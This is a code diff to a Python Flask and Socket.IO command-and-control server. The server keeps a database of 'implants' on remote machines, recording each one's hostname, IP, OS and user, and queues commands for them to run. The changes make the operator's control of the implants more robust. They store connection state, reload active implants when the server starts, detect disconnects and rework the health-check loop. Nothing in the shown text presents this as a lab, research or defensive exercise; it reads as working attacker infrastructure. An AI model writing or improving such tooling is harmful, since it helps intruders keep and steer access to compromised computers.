@@ -42,7 +42,7 @@ def init_db():
     c = conn.cursor()
     c.execute('''CREATE TABLE IF NOT EXISTS implants
                  (id TEXT PRIMARY KEY, hostname TEXT, ip TEXT, 
-                  os TEXT, user TEXT, check_in TEXT)''')
+                  os TEXT, user TEXT, check_in TEXT, connected BOOLEAN)''')
     c.execute('''CREATE TABLE IF NOT EXISTS commands
                  (id INTEGER PRIMARY KEY AUTOINCREMENT,
                   implant_id TEXT, command TEXT, 
@@ -55,6 +55,24 @@ def get_db():
     conn = sqlite3.connect('c2.db')
     conn.row_factory = sqlite3.Row
     return conn
+
+def load_active_implants():
+    """Load active implants from database"""
+    conn = get_db()
+    implants = conn.execute('SELECT * FROM implants WHERE connected = 1').fetchall()
+    for implant in implants:
+        implant_id = implant['id']
+        active_implants[implant_id] = {
+            'hostname': implant['hostname'],
+            'ip': implant['ip'],
+            'os': implant['os'],
+            'user': implant['user'],
+            'connected': True,
+            'last_seen': implant['check_in'],
+            'last_activity': 'Connected'
+        }
+        command_queues[implant_id] = queue.Queue()
+    conn.close()
 
 @app.route('/')
 def index():
@@ -151,33 +169,71 @@ def handle_connect():
 def handle_disconnect():
     """Handle client disconnection"""
     logger.info(f"Client disconnected: {request.sid}")
+    # Find and update disconnected implant
+    for implant_id, implant in active_implants.items():
+        if implant.get('sid') == request.sid:
+            implant['connected'] = False
+            implant['last_activity'] = 'Disconnected'
+            # Update database
+            conn = get_db()
+            conn.execute('UPDATE implants SET connected = 0 WHERE id = ?', (implant_id,))
+            conn.commit()
+            conn.close()
+            # Broadcast update
+            emit('implants_update', active_implants, broadcast=True)
+            break
 
 @socketio.on('register')
 def handle_register(data):
     """Handle implant registration"""
     implant_id = data.get('id')
-    if implant_id:
-        # Store implant information
-        conn = get_db()
-        conn.execute('''INSERT OR REPLACE INTO implants 
-                        (id, hostname, ip, os, user, check_in)
-                        VALUES (?, ?, ?, ?, ?, ?)''',
+    if not implant_id:
+        return
+    
+    # Check if implant already exists
+    conn = get_db()
+    existing_implant = conn.execute('SELECT * FROM implants WHERE id = ?', (implant_id,)).fetchone()
+    
+    if existing_implant:
+        # Update existing implant
+        conn.execute('''UPDATE implants 
+                       SET hostname = ?, ip = ?, os = ?, user = ?, 
+                           check_in = ?, connected = 1
+                       WHERE id = ?''',
+                    (data.get('hostname'), data.get('ip'),
+                     data.get('os'), data.get('user'),
+                     datetime.now().isoformat(), implant_id))
+    else:
+        # Insert new implant
+        conn.execute('''INSERT INTO implants 
+                       (id, hostname, ip, os, user, check_in, connected)
+                       VALUES (?, ?, ?, ?, ?, ?, 1)''',
                     (implant_id, data.get('hostname'), data.get('ip'),
                      data.get('os'), data.get('user'),
                      datetime.now().isoformat()))
-        conn.commit()
-        conn.close()
-        
-        # Initialize command queue for this implant
+    
+    conn.commit()
+    conn.close()
+    
+    # Update active implants
+    active_implants[implant_id] = {
+        'hostname': data.get('hostname'),
+        'ip': data.get('ip'),
+        'os': data.get('os'),
+        'user': data.get('user'),
+        'connected': True,
+        'last_seen': datetime.now().isoformat(),
+        'last_activity': 'Connected',
+        'sid': request.sid  # Store socket ID
+    }
+    
+    # Initialize command queue if not exists
+    if implant_id not in command_queues:
         command_queues[implant_id] = queue.Queue()
-        active_implants[implant_id] = {
-            'last_seen': time.time(),
-            'status': 'active',
-            'last_activity': 'Connected'
-        }
-        
-        emit('implants_update', active_implants, broadcast=True)
-        emit('registered', {'status': 'success'})
+    
+    # Broadcast updates
+    emit('implants_update', active_implants, broadcast=True)
+    emit('registered', {'status': 'success'})
 
 @socketio.on('command_result')
 def handle_command_result(data):
@@ -278,18 +334,28 @@ def handle_execute_command(data):
 def check_implant_health():
     """Periodically check implant health"""
     while True:
-        current_time = time.time()
-        for implant_id, implant in active_implants.items():
-            if current_time - implant['last_seen'] > app.config['IMPLANT_CHECK_INTERVAL']:
-                implant['status'] = 'disconnected'
-                emit('implant_status', {
-                    'implant_id': implant_id,
-                    'status': 'disconnected'
-                }, broadcast=True)
+        current_time = datetime.now()
+        for implant_id, implant in list(active_implants.items()):
+            last_seen = datetime.fromisoformat(implant['last_seen'])
+            if (current_time - last_seen).total_seconds() > app.config['IMPLANT_CHECK_INTERVAL']:
+                # Mark implant as disconnected
+                implant['connected'] = False
+                implant['last_activity'] = 'Disconnected'
+                
+                # Update database
+                conn = get_db()
+                conn.execute('UPDATE implants SET connected = 0 WHERE id = ?', (implant_id,))
+                conn.commit()
+                conn.close()
+                
+                # Broadcast update
+                socketio.emit('implants_update', active_implants, broadcast=True)
+        
         time.sleep(5)
 
 if __name__ == '__main__':
     init_db()
+    load_active_implants()  # Load existing active implants
     # Start health check thread
     health_thread = threading.Thread(target=check_implant_health, daemon=True)
     health_thread.start()
